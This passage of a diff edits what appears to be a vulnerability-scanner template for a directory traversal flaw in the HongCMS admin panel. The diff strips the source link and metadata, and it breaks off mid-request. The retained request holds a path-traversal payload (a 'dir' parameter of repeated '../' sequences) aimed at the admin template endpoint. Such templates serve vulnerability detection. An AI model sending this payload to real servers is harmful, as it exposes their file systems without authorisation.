@@ -3,12 +3,8 @@ info:
   name: HongCMS后台目录穿越
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/faoeu1s0533t11sm'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: faoeu1s0533t11sm
-    fofa: 暂无
 http:
 - raw:
   - 'GET /admin/index.php/template?dir=/../../../../../../../../ HTTP/1.1
